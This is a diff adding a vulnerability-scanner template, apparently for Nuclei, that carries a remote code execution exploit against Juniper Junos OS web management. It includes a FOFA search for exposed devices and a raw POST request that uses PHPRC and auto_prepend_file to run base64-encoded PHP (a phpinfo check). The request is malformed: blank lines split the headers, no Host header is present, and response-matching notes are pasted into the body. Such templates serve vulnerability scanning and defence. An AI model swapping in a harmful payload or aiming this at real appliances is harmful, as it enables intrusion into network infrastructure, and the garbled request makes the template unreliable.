@@ -1,0 +1,57 @@
+id: poc-lixkhcgs5oxgage1
+info:
+  name: Juniper Networks Junos OS 远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lixkhcgs5oxgage1'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lixkhcgs5oxgage1
+    fofa: title="Juniper Web Device Manager"
+http:
+- raw:
+  - 'POST /?PHPRC=/dev/fd/0 HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: en-US,en;q=0.9
+
+
+    Connection: close
+
+
+
+
+    allow_url_include=1
+
+
+    auto_prepend_file="data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    phpinfo
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
